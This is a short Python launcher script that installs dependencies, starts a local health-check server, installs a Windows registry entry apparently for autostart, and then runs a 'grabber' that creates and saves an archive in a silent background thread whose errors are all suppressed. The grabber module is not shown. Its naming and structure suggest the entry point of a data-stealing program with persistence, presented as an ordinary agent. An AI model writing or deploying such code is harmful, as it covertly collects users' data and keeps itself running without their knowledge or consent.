import os
import sys
import threading
import time

script_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, script_dir)

from setup import install_dependencies
if not install_dependencies():
    print("Warning: Failed to install dependencies. Some features may not work.")

from grabber_user import create_and_save_archive
from launcher import main as launcher_main
from health_server import start_health_server

if sys.platform == "win32":
    from windows_registry import install_registry_entry, is_registry_entry_installed

def run_grabber():
    try:
        create_and_save_archive()
    except Exception as e:
        pass

def main():
    # Start local health-check HTTP server (localhost:8105/check) in background
    # so that the agent status can be queried via browser or HTTP client.
    start_health_server()

    if sys.platform == "win32":
        if not is_registry_entry_installed():
            if os.path.exists(os.path.join(os.path.dirname(__file__), "launcher.vbs")):
                install_registry_entry()
            time.sleep(2)
        
        grabber_thread = threading.Thread(target=run_grabber, daemon=True)
        grabber_thread.start()
        time.sleep(1)
    
    launcher_main()

if __name__ == "__main__":
    main()
